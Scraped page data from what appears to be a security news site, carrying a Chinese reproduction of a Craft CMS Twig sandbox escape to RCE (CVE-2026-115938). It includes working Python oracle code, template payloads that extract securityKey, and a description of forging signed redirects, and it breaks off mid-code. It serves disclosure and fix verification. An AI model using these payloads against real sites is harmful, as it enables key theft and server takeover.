[{"_1":2,"_3":4},"root",{"_5":124},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1794876038000,"id","zuc07ygmgxny20pq5v7u0scuh","title","Craft CMS CVE-2026-115938 Twig 沙箱逃逸至 RCE 复现","originalTitle","CVE-2026-115938：Craft CMS 5.11.1 Twig 沙箱逃逸到 RCE 复现","summary","作者复现 Craft CMS CVE-2026-115938 的 Twig 沙箱逃逸至 RCE 链路。","reason","文章完整拆解沙箱绕过、密钥盲注与签名伪造链路，并提供修复验证依据，适合用于复核影响与设计检测方案。","source",{"_72":123},"links",{"_114":122},"publishedAt","2026-11-15T11:36:19.000Z","discoveredAt","2026-11-16T08:50:18.949Z","timelineAt","category","disclosure","tags",[117,118,119,120,73,121],"score",75,"selected",true,"channel","news","story",{"_77":78,"_13":79},"x","readingMode","full","author","body",{"_61":113,"_114":-5,"_115":114,"_116":37},"outline",[80,81,82,83,84,85,86,87,88,89],"relatedStories",[76],"topics",[68,69],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fWj4xZOMsZQM","reportCount",1,"additionalSourceCount",0,{"_70":74,"_72":75},{"_70":71,"_72":73},"slug","research","name","技术研究","vuln","漏洞披露",{"_77":78,"_13":79},"publicId","cd424c3c-7c17-4055-aa2c-676cee49e726","Craft CMS Twig沙箱逃逸至RCE已被复现",{"_11":111,"_91":112,"_93":94},{"_11":109,"_91":110,"_93":94},{"_11":107,"_91":108,"_93":94},{"_11":105,"_91":106,"_93":94},{"_11":103,"_91":104,"_93":94},{"_11":101,"_91":102,"_93":94},{"_11":99,"_91":100,"_93":94},{"_11":97,"_91":98,"_93":94},{"_11":95,"_91":96,"_93":94},{"_11":90,"_91":92,"_93":94},"sec-10","text","附录：实验文件源代码","level",2,"sec-9","10. 加固与处置建议","sec-8","9. 修复验证","sec-7","8. RCE：让 system 落地","sec-6","7. 漏洞点二：拿到密钥后，签名不再可信","sec-5","6. 提取 securityKey：把密钥编码成 2 / 999999","sec-4","5. 沙箱为什么没挡住：被 Craft 覆盖的 column 过滤器","sec-3","4. 漏洞点一：elementIds 被当模板渲染","sec-2","3. 背景：条件规则是怎么被执行到的","sec-1","2. 测试环境","<p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194515-06447f55-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=f1c5cd48d4e71b50\" loading=\"lazy\" decoding=\"async\" width=\"997.6\"></p><p>1. 漏洞概述</p><p>受影响组件为 <code>craftcms/cms</code>。受影响范围取自 <a href=\"https://github.com/craftcms/cms/security/advisories/GHSA-v4q3-2g5g-wjj6\">GitHub Security Advisory </a><code>GHSA-v4q3-2g5g-wjj6</code> 的标注：Craft 4 线为 4.0.0 至 4.18.8，Craft 5 线为 5.0.0 至 5.11.1。修复版本为 4.18.9 与 5.11.2，<a href=\"https://github.com/craftcms/cms/releases/tag/5.11.2\">5.11.2 发布说明</a> 的 CHANGELOG 把这条按 high-severity information disclosure 归类。漏洞属于模板引擎注入（CWE-94 / CWE-1336）。触发需要两个前提：账号能登录控制面板并打开元素索引（本次实测用 <code>admin</code>），且目标为 Craft 5.11.2 / 4.18.9 之前的未打补丁版本；走到 RCE 还要再加一条，该账号具备至少一个会读取 <code>redirect</code> 的控制面板动作权限。CVE 记录为 <code>CVE-2026-115938</code>（<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-115938\">NVD</a>）。5.11.2 于 2026-09-17 发布，此前 5.11.1 为最新稳定版，5.x 线在修复前均处于可利用状态。另外，模板渲染上的沙箱是 4.18.0 / 5.10.0 才引入的加固，两条线的早期版本没有这一层，攻击面因此在版本区间内部还有一次切分。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06925e16-e0ea-1.svg&amp;mode=full&amp;exp=1795132800&amp;sig=80529d3261438e5f\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06925e16-e0ea-1.svg&amp;mode=thumb&amp;exp=1795132800&amp;sig=1e584f8fb572a904 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06925e16-e0ea-1.svg&amp;mode=image-1200&amp;exp=1795132800&amp;sig=b34c9d70885b4d9d 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06925e16-e0ea-1.svg&amp;mode=full&amp;exp=1795132800&amp;sig=80529d3261438e5f 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1816\"></p><p>Craft 允许在元素搜索的“条件规则（condition rules）”里用 Twig 表达式动态指定元素 ID。该表达式从 4.18.0 / 5.10.0 起运行在 Twig 沙箱内（更早版本直接把 <code>elementIds</code> 当普通模板渲染），白名单里保留了 <code>column</code> 过滤器，而 Craft 覆盖注册的这份 <code>column</code> 实现只做点号过滤、不做属性检查，属性名被当成“列名”交给 Yii 的 <code>ArrayHelper::getColumn()</code>，落在 Twig <code>SecurityPolicy</code> 之外，于是可以用单段属性查找把沙箱内的 <code>craft</code> 全局对象逐层“剥”到 <code>GeneralConfig::securityKey</code>。拿到密钥后，Craft 的 HMAC 令牌不再有秘密可言，攻击者可离线伪造 <code>redirect</code> 参数，而该参数会被送入<strong>未沙箱</strong>的 <code>View::renderObjectTemplate()</code> 编译，最终达成命令执行。</p><h2 id=\"sec-1\">2. 测试环境</h2><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06ce692e-e0ea-1.svg&amp;mode=full&amp;exp=1795132800&amp;sig=5a9e23022c1af1a6\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06ce692e-e0ea-1.svg&amp;mode=thumb&amp;exp=1795132800&amp;sig=fe172c8a8e316a76 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06ce692e-e0ea-1.svg&amp;mode=image-1200&amp;exp=1795132800&amp;sig=017b5dc8b1014874 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194516-06ce692e-e0ea-1.svg&amp;mode=full&amp;exp=1795132800&amp;sig=5a9e23022c1af1a6 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1050\"></p><p>确认锁定版本：</p><pre><code>grep -A2 '\"name\": \"craftcms/cms\"' /home/nl/www/craft/composer.lock | head -4</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194517-070d301c-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=819d591068e4f9a2\" loading=\"lazy\" decoding=\"async\" width=\"622.4\"></p><p>漏洞链涉及的两个依赖版本：</p><pre><code>python3 -c \"import json;d=json.load(open('composer.lock'));print('\\n'.join(p['name']+' '+p['version'] for p in d['packages'] if p['name'] in ('twig/twig','yiisoft/yii2')))\"</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194517-074a2836-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=10272b25ac8bc077\" loading=\"lazy\" decoding=\"async\" width=\"1304.8\"></p><p>PHP 版本：</p><pre><code>php -v</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194517-07851642-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=d431ad1339f789ce\" loading=\"lazy\" decoding=\"async\" width=\"528\"></p><p>监听端口：</p><pre><code>ss -ltnp | grep -E \":8080|:80 \"</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194518-07c0a4d0-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=31e3f9ba88da55ec\" loading=\"lazy\" decoding=\"async\" width=\"684.8\"></p><p>进程列表：</p><pre><code>ps -eo pid,cmd | grep -E \"php -S|nginx: master\" | grep -v grep</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194518-08007e62-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=743e141ad60e0c4d\" loading=\"lazy\" decoding=\"async\" width=\"520\"></p><h2 id=\"sec-2\">3. 背景：条件规则是怎么被执行到的</h2><p>控制面板的元素列表由 <code>/admin/actions/element-indexes/get-elements</code> 这个 JSON 接口驱动。请求体里的 <code>condition</code> 描述了筛选条件，Craft 会把它还原成一组条件规则对象：</p><pre><code>POST /admin/actions/element-indexes/get-elements\nX-Requested-With: XMLHttpRequest\nX-CSRF-Token: &lt;csrfTokenValue&gt;\n\nelementType=craft\\elements\\Entry\nsource=section:9386ef1b-4018-4eaa-923c-093d3efd1bfb\nviewState[mode]=table\ncondition[class]=craft\\elements\\conditions\\entries\\EntryCondition\ncondition[conditionRules][0][class]=craft\\elements\\conditions\\RelatedToConditionRule\ncondition[conditionRules][0][elementIds]={{ ... }}</code></pre><p><code>condition[conditionRules]</code> 是纯用户可控数组，Craft 逐项用 <code>createConditionRule()</code> 实例化。</p><p><code>vendor/craftcms/cms/src/base/conditions/BaseCondition.php:184</code>，<code>setConditionRules()</code>：</p><pre><code>public function setConditionRules(array $rules): void\n{\n    $this-&gt;_conditionRules = Collection::make();\n    $projectConfig = Craft::$app-&gt;getProjectConfig();\n\n    foreach ($rules as $rule) {\n        if (!$rule instanceof ConditionRuleInterface) {\n            try {\n                $rule = $this-&gt;createConditionRule($rule);\n            } catch (InvalidArgumentException $e) {\n                Craft::warning(\"Invalid condition rule: {$e-&gt;getMessage()}\");\n                continue;\n            }\n        }\n        // ...</code></pre><p>构造入口是 <code>createConditionRule()</code>，除类型合并与属性对齐外，它只校验类名实现了 <code>ConditionRuleInterface</code>，随后用 <code>Craft::createObject()</code> 把请求体里的 <code>class</code> 与其余键当作构造参数：</p><p><code>vendor/craftcms/cms/src/services/Conditions.php:125</code>，<code>createConditionRule()</code> 的类校验与构造段：</p><pre><code>        if (!is_subclass_of($class, ConditionRuleInterface::class)) {\n            throw new InvalidArgumentException(\"Invalid condition rule class: $class\");\n        }\n\n        /** @var ConditionRuleInterface */\n        return Craft::createObject([\n            'class' =&gt; $class,\n            'attributes' =&gt; $config,\n        ]);\n        // ...</code></pre><p><code>RelatedToConditionRule</code> 由 <code>ElementCondition::selectableConditionRules()</code> 列入可选规则（<code>ElementCondition.php:167</code>），因此请求体里直接点名这个类不会因为不属于该条件类型被拒。请求体里给出的 <code>class</code> 和它的属性会被直接构造成规则对象，<code>elementIds</code> 字符串原样进入规则实例。</p><h2 id=\"sec-3\">4. 漏洞点一：<code>elementIds</code> 被当模板渲染</h2><p><code>RelatedToConditionRule</code> 继承自 <code>BaseElementSelectConditionRule</code>，它的 <code>getElementIds()</code> 会把 <code>elementIds</code> 当模板渲染（<a href=\"https://github.com/craftcms/cms/blob/5.11.1/src/base/conditions/BaseElementSelectConditionRule.php#L113\">BaseElementSelectConditionRule.php:113，5.11.1</a>）。4.x 线同名类只提供单数版本 <code>getElementId()</code>（属性名 <code>elementId</code>，返回值直接当 ID 用，不按逗号切分，<a href=\"https://github.com/craftcms/cms/blob/4.18.8/src/base/conditions/BaseElementSelectConditionRule.php\">4.18.8 同名文件</a>）；4.18.8 的渲染入口已是 <code>renderSandboxedObjectTemplate()</code>，5.x 的改动只是把单值扩成逗号分隔的列表，渲染入口未变。</p><p><code>vendor/craftcms/cms/src/base/conditions/BaseElementSelectConditionRule.php:113</code></p><pre><code>public function getElementIds(bool $parse = true): array|string\n{\n    if ($parse &amp;&amp; is_string($this-&gt;_elementIds)) {\n        $elementIds = App::parseEnv($this-&gt;_elementIds);\n\n        // Only allow combining env &amp; Twig parsing for simple env vars\n        if (\n            $elementIds === $this-&gt;_elementIds ||\n            preg_match('/^\\$\\{?\\w+}?$/', trim($this-&gt;_elementIds))\n        ) {\n            if ($this-&gt;condition instanceof ElementCondition &amp;&amp; isset($this-&gt;condition-&gt;referenceElement)) {\n                $referenceElement = $this-&gt;condition-&gt;referenceElement;\n            } else {\n                $referenceElement = new stdClass();\n            }\n\n            try {\n                $elementIds = Craft::$app-&gt;getView()-&gt;renderSandboxedObjectTemplate($elementIds, $referenceElement);\n            } catch (Throwable $e) {\n            }\n        }\n\n        return array_values(array_filter(array_map(\n            fn(string $elementId) =&gt; (int)trim($elementId),\n            explode(',', $elementIds),\n        )));\n    }\n\n    return $this-&gt;_elementIds ?? [];\n}</code></pre><p>渲染入口是 <code>renderSandboxedObjectTemplate()</code>，已经套了沙箱。渲染结果按 <code>,</code> 切分后逐个 <code>(int)</code> 强转，模板无论如何只能吐出一串整数。强转前的中间量 <code>$elementIds</code>，就是攻击者能拿到的全部输出通道。</p><p><code>renderSandboxedObjectTemplate()</code> 是后来补上的加固，不是 Craft 一直以来的渲染方式。4.x 线在 4.18.0 之前、5.x 线在 5.10.0 之前，<code>getElementId()</code> / <code>getElementIds()</code> 调的都是不带沙箱的 <code>renderObjectTemplate()</code>，<code>elementIds</code> 直接当普通 Twig 模板编译，<code>src/config/twig-sandbox.php</code> 里的白名单在那两个区间完全不参与。GHSA 覆盖的 4.0.0–4.18.8 与 5.0.0–5.11.1 整段都受这个漏洞影响，攻击面却分成两段：4.18.0 / 5.10.0 之前的版本不需要绕沙箱，<code>column</code> 在模板里本来就能用；从这两个版本起沙箱才顶在前面，<code>column</code> 绕过（<code>preventDottedNameInSandbox()</code> 只拦点号、不查属性）只对装了沙箱的 4.18.0–4.18.8 与 5.10.0–5.11.1 成立。沙箱落地时把 <code>column</code> 留在了过滤器白名单里，而 Craft 覆盖注册的 <code>column</code> 实现不做属性检查，加固在这一处没有闭合。</p><p>强转限制了直接回显，限制不了读：只要能把布尔值编码成两个不同整数，就能做盲注。</p><h2 id=\"sec-4\">5. 沙箱为什么没挡住：被 Craft 覆盖的 <code>column</code> 过滤器</h2><p>Craft 的沙箱策略来自 <code>src/config/twig-sandbox.php</code>（<a href=\"https://github.com/craftcms/cms/blob/5.11.1/src/config/twig-sandbox.php\">5.11.1 原文</a>）：</p><pre><code>grep -n \"'column'\\|allowedMethods\\|allowedProperties\\|allowedClasses\" vendor/craftcms/cms/src/config/twig-sandbox.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194519-083fcb51-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=6c355d3812ca7c92\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194519-083fcb51-e0ea-1.png&amp;mode=thumb&amp;exp=1795132800&amp;sig=03b89ef8de52728f 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194519-083fcb51-e0ea-1.png&amp;mode=image-1200&amp;exp=1795132800&amp;sig=7635de2cd3a19c3e 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194519-083fcb51-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=6c355d3812ca7c92 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"876\"></p><p>白名单里的危险函数计数：</p><pre><code>grep -cE \"'(system|exec|passthru|shell_exec|proc_open)'\" vendor/craftcms/cms/src/config/twig-sandbox.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194519-087f76f8-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=edb72c2230629553\" loading=\"lazy\" decoding=\"async\" width=\"800.8\"></p><p><code>allowedMethods</code> 与 <code>allowedProperties</code> 都是空数组——沙箱内既不能调方法，也不能读属性，<code>craft.app.config...</code> 这类链式访问按设计会被 <code>SecurityPolicy</code> 拦死；<code>system</code>、<code>exec</code>、<code>passthru</code> 一个都不在函数白名单里。而 <code>allowedFilters</code> 的第 26 行留着 <code>column</code>。</p><p>Twig 3.28.0 自带的 <code>column</code> 确实带沙箱分支，注册时挂了 <code>needs_is_sandboxed</code>：</p><pre><code>nl -ba vendor/twig/twig/src/Extension/CoreExtension.php | sed -n '270p;1968,1983p'</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194519-08c873a3-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=a4823cd80ffcd6dc\" loading=\"lazy\" decoding=\"async\" width=\"958.4\"></p><p>按这段实现，沙箱内的 <code>column</code> 会为每个对象元素调 <code>checkPropertyAllowed()</code>，空白名单立刻抛 <code>SecurityError</code>，链子断在第一步。5.11.1 实际执行的不是它。</p><p>Craft 在同一个名字上注册了自己的过滤器，覆盖了内置实现：</p><pre><code>nl -ba vendor/craftcms/cms/src/web/twig/Extension.php | sed -n '235p;516,525p;535,539p'</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194520-09100396-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=689f185253bced87\" loading=\"lazy\" decoding=\"async\" width=\"1270.4\"></p><p><code>columnFilter()</code> 里与沙箱有关的动作只有一句 <code>preventDottedNameInSandbox()</code>，拦的是键名中的 <code>.</code>、<code>[</code>、<code>]</code>，针对 <code>craft.app.config.general.securityKey</code> 这类点号穿透；随后 <code>ArrayHelper::getColumn()</code> 按名字取“列”，全程没有调用 <code>SecurityPolicy</code>。</p><p>插入到 <code>vendor/craftcms/cms/src/web/twig/Extension.php:537</code>，<code>columnFilter()</code> 的第一行：</p><pre><code>file_put_contents('/tmp/probe.log', 'isSandboxed=' . var_export($isSandboxed, true) . ' name=' . var_export($name, true) . ' arrayType=' . get_debug_type($array) . PHP_EOL, FILE_APPEND);</code></pre><p>对同一条 payload 发一次请求：</p><pre><code>python3 probe_once.py</code></pre><pre><code>cat /tmp/probe.log</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194520-0950903b-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=cf2736df97e0e7ee\" loading=\"lazy\" decoding=\"async\" width=\"468\"></p><p>四次取值都发生在沙箱内（<code>isSandboxed=true</code>），四次都成功读到属性。标志位传递正确，问题在接收标志的实现，空的 <code>allowedProperties</code> 从头到尾没被问过。</p><p>点号守卫对这条路无效：<code>app</code>、<code>config</code>、<code>general</code>、<code>securityKey</code> 都是单段名，不含 <code>.</code>、<code>[</code>、<code>]</code>，守卫直接放行；把属性名当成一行数据里的列名取出，是 <code>ArrayHelper::getColumn()</code> 的常规用法，语义与模板里写 <code>array.name</code> 相当，却少了模板语法那层会去查策略的入口。</p><p>于是单段查找可以一层层往下剥：</p><pre><code>[craft]                                  {# 沙箱内可直接引用的全局变量 #}\n [craft]|column('app')                   {# → Craft::$app #}\n [craft]|column('app')|column('config')  {# → Craft::$app-&gt;config #}\n   ...|column('general')                 {# → GeneralConfig #}\n   ...|column('securityKey')             {# → 全局密钥字符串 #}</code></pre><p>5.11.2 补的就是这一处，<a href=\"https://github.com/craftcms/cms/blob/5.11.2/src/web/twig/Extension.php\">同文件的 </a><code>columnFilter()</code> 增加了环境参数与逐元素属性检查。</p><p><code>vendor/craftcms/cms/src/web/twig/Extension.php</code>（5.11.2）</p><pre><code>public function columnFilter(TwigEnvironment $env, bool $isSandboxed, mixed $array, mixed $name, bool $keepKeys = true): array\n{\n    $this-&gt;preventDottedNameInSandbox($isSandboxed, $name, 'column');\n\n    if (!$isSandboxed || !is_string($name)) {\n        return ArrayHelper::getColumn($array, $name, $keepKeys);\n    }\n\n    $sandbox = $env-&gt;getExtension(SandboxExtension::class);\n\n    if (is_object($array) &amp;&amp; !$array instanceof Traversable) {\n        // $array is a single object rather than a list of rows, so extracting a \"column\" from it would\n        // otherwise mean enumerating its public properties without any sandbox checks. Treat this the same\n        // way the template would if it had accessed the property directly, e.g. `array.name`.\n        $sandbox-&gt;checkPropertyAllowed($array, $name);\n        return [ArrayHelper::getValue($array, $name)];\n    }\n\n    // Check each object element’s property/method the same way the template would if it had accessed it\n    // directly, e.g. `element.name`, rather than letting ArrayHelper::getValue() read it unchecked.\n    $result = [];\n    foreach ($array as $k =&gt; $element) {\n        if (is_object($element)) {\n            $sandbox-&gt;checkPropertyAllowed($element, $name);\n        }\n        if ($keepKeys) {\n            $result[$k] = ArrayHelper::getValue($element, $name);\n        } else {\n            $result[] = ArrayHelper::getValue($element, $name);\n        }\n    }\n    return $result;\n}</code></pre><p>点号守卫原样保留，取列之前补上 <code>checkPropertyAllowed()</code>，空的 <code>allowedProperties</code> 才真正生效：沙箱内读 <code>app</code> 就会抛 <code>SecurityError</code>，被 <code>getElementIds()</code> 的 <code>catch (Throwable $e) {}</code> 吞掉，渲染结果为空，预言机随之失效。</p><h2 id=\"sec-5\">6. 提取 securityKey：把密钥编码成 2 / 999999</h2><p><code>getElementIds()</code> 最终返回整数数组，<code>RelatedToConditionRule</code> 会把这些 ID 当成“相关元素”去过滤条目。因此构造一个恒为真的数值表达式，就能得到一个稳定的远端字符预言机：</p><p>条件成立时模板输出 <code>2</code>，这是库里真实存在的条目 ID，<code>relatedTo</code> 命中，接口返回条目 HTML（含 <code>data-id=\"2\"</code>）；条件不成立时模板输出 <code>999999</code>，该 ID 不存在，<code>relatedTo</code> 落空，接口返回空列表。两个分支在响应体上完全可区分。</p><p><code>first</code>、<code>slice</code> 同样在同一份 <code>allowedFilters</code> 白名单里（第 42、83 行），取首元素与切片不受沙箱限制，读出来的值能在沙箱内一路加工成可比较的形式。</p><p><code>oracle.py</code> 对字符做单调比较、二分还原密钥，常量、取数与比较部分：</p><pre><code>BASE = 'http://192.168.205.135:8080'\nH_JSON = {'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json'}\nSRC = 'section:9386ef1b-4018-4eaa-923c-093d3efd1bfb'\nSTATS = {'n': 0}\nKEY = \"([craft]|column('app')|column('config')|column('general')|column('securityKey'))|first\"\nCHARSET = sorted(set(string.digits + string.ascii_uppercase + string.ascii_lowercase))\n\ndef le(s, csrf, pos, ch):\n    return probe(s, csrf, \"((%s)|slice(%d,1)) &lt;= '%s'\" % (KEY, pos, ch))\n\ndef empty(s, csrf, pos):\n    return probe(s, csrf, \"((%s)|slice(%d,1)) == ''\" % (KEY, pos))</code></pre><p><code>login()</code> 取登录页的 CSRF 令牌完成登录，返回会话与登录后的 <code>csrfTokenValue</code>；<code>probe()</code> 把表达式拼进 <code>condition[conditionRules][0][elementIds]</code>，再按响应 HTML 的 <code>data-id</code> 列表里有没有 <code>2</code> 判真假：</p><pre><code>def login():\n    s = requests.Session()\n    r = s.get(BASE + '/admin/login', timeout=20)\n    token = re.search(r'name=\"CRAFT_CSRF_TOKEN\"\\s+value=\"([^\"]+)\"', r.text).group(1)\n    r2 = s.post(BASE + '/admin/actions/users/login',\n                data={'loginName': 'admin', 'password': 'Password123', 'CRAFT_CSRF_TOKEN': token},\n                headers=H_JSON, timeout=30)\n    return s, r2.json()['csrfTokenValue']\n\n\ndef probe(s, csrf, expr):\n    data = {\n        'elementType': 'craft\\\\elements\\\\Entry',\n        'source': SRC,\n        'viewState[mode]': 'table',\n        'viewState[static]': '0',\n        'viewState[inlineEditing]': '0',\n        'condition[class]': 'craft\\\\elements\\\\conditions\\\\entries\\\\EntryCondition',\n        'condition[conditionRules][0][class]': 'craft\\\\elements\\\\conditions\\\\RelatedToConditionRule',\n        'condition[conditionRules][0][elementIds]': '{{ %s ? 2 : 999999 }}' % expr,\n    }\n    resp = s.post(BASE + '/admin/actions/element-indexes/get-elements', data=data,\n                  headers={**H_JSON, 'X-CSRF-Token': csrf}, timeout=30)\n    STATS['n'] += 1\n    try:\n        html = resp.json().get('html', '') or ''\n    except Exception:\n        return False\n    return '2' in re.findall(r'data-id=\"(\\d+)\"', html)</code></pre><p>服务端实际收到的 <code>elementIds</code> 形如：</p><pre><code>RAW=[{\"class\":\"craft\\\\elements\\\\conditions\\\\RelatedToConditionRule\",\"elementIds\":\"{{ ((([craft]|column('app')|column('config')|column('general')|column('securityKey'))|first)|slice(31,1)) &lt;= 'T' ? 2 : 999999 }}\"}]\nRENDERED='999999'\nQUERY_AUTHORID=null</code></pre><p><code>oracle.py</code> 输出：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194521-09920f58-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=a85fedc42acaa6b8\" loading=\"lazy\" decoding=\"async\" width=\"430.4\"></p><p>字符集 62（数字 + 大小写字母），单字符二分 6 次比较，加上 <code>== ''</code> 判空，32 字符密钥走 224 次请求。全程只有一个登录后的 JSON 接口，无报错、无写入，流量形态和正常翻页筛选一致。</p><h2 id=\"sec-6\">7. 漏洞点二：拿到密钥后，签名不再可信</h2><p>Craft 的 <code>Security</code> 组件对 <code>redirect</code> 这类参数使用 Yii 的通用 HMAC 令牌格式（<a href=\"https://github.com/yiisoft/yii2/blob/2.0.55/framework/base/Security.php#L348\">yiisoft/yii2 2.0.55，Security.php:348</a>）。</p><p><code>vendor/yiisoft/yii2/base/Security.php:348</code>，<code>hashData()</code>：</p><pre><code>public function hashData($data, $key, $rawHash = false)\n{\n    $hash = hash_hmac($this-&gt;macHash, $data, $key, $rawHash);\n    if (!$hash) {\n        throw new InvalidConfigException('Failed to generate HMAC with hash algorithm: ' . $this-&gt;macHash);\n    }\n\n    return $hash . $data;\n}</code></pre><p>即 <code>sha256_hmac(data, securityKey)</code> 的十六进制串<strong>直接拼接</strong> <code>data</code> 本身。这是一个自描述的报文格式：拿到密钥后，任何人都能对任意 <code>data</code> 离线签名。这里的 HMAC 密钥就是从元素索引条件里读出的 <code>securityKey</code>，<code>exploit5.py</code> 用它算出的签名在 <code>/admin/actions/elements/duplicate</code> 上通过了校验（复制动作返回 200），信息泄露因此直接连到命令执行。</p><p>落地有两个条件。一是动作在取跳转地址时把元素对象一并传给 <code>getPostedRedirectUrl($element)</code>，这样的调用点在控制面板里不止一处：<code>ElementsController::_asSuccess()</code>（<code>ElementsController.php:3027</code>）与 <code>UsersController::actionLogin()</code> 的两步验证分支（<code>UsersController.php:294</code>）。二是签名本身不绑定参数名与用途，令牌只校验 HMAC 值，不区分这个签名原本是给哪个字段的，同一份密钥签出的模板在任何取 <code>redirect</code> 的动作上都能过。</p><p><code>redirect</code> 参数的校验与使用发生在 <code>Controller</code> 基类（<a href=\"https://github.com/craftcms/cms/blob/5.11.1/src/web/Controller.php#L656\">Controller.php:656，5.11.1</a>）。</p><p><code>vendor/craftcms/cms/src/web/Controller.php:656</code>，<code>getPostedRedirectUrl()</code>：</p><pre><code>protected function getPostedRedirectUrl(?object $object = null): ?string\n{\n    $url = $this-&gt;request-&gt;getValidatedBodyParam('redirect');\n\n    if ($url &amp;&amp; $object) {\n        $url = $this-&gt;getView()-&gt;renderObjectTemplate($url, $object);\n    }\n\n    $params = $this-&gt;request-&gt;getBodyParam('redirectParams');\n    // ...\n}</code></pre><p><code>getValidatedBodyParam()</code> 先取 <code>redirect</code> 原值，再交给 <code>Security::validateData()</code>，校验通过后把 <code>data</code> 部分返回（<a href=\"https://github.com/craftcms/cms/blob/5.11.1/src/web/Request.php#L1013\">Request.php:1013，5.11.1</a>），攻击者签的模板被原样取回。</p><p>紧接着的 <code>renderObjectTemplate()</code> 是未沙箱版本（<a href=\"https://github.com/craftcms/cms/blob/5.11.1/src/web/View.php#L751\">View.php:751，5.11.1</a>）。</p><p><code>vendor/craftcms/cms/src/web/View.php:751</code></p><pre><code>public function renderObjectTemplate(\n    string $template,\n    mixed $object,\n    array $variables = [],\n    string $templateMode = self::TEMPLATE_MODE_SITE,\n    string|false $escaperStrategy = false,\n): string {\n    // ...\n}</code></pre><p>与安全版本相比，差别只有一行包装（<a href=\"https://github.com/craftcms/cms/blob/5.11.1/src/web/View.php#L863\">View.php:863，5.11.1</a>）。</p><p><code>vendor/craftcms/cms/src/web/View.php:863</code>，<code>renderSandboxedObjectTemplate()</code>：</p><pre><code>public function 